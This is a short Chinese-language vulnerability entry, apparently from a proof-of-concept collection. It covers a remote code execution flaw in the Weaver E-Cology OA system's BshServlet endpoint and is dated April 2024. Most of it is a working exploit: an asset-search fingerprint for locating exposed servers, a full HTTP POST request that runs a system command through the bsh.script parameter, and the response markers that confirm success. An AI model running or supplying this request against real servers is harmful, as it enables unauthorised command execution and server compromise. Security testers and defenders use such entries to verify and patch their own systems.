﻿# 泛微E-Cology bsh.servlet.BshServlet RCE漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：泛微E-Cology bsh.servlet.BshServlet接口处存在RCE漏洞，远程代码执行漏洞,恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。

> 漏洞特征：app="泛微-EOffice"||app="泛微-OA（e-cology）"

> 验证脚本：HTTP

```
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("whoami");&bsh.servlet.output=raw
```

> 响应代码特征：200

> 响应内容特征：system

> 上传文件定位：

> 验证文件来源：泛微E-Cology bsh.servlet.BshServlet RCE漏洞.poc

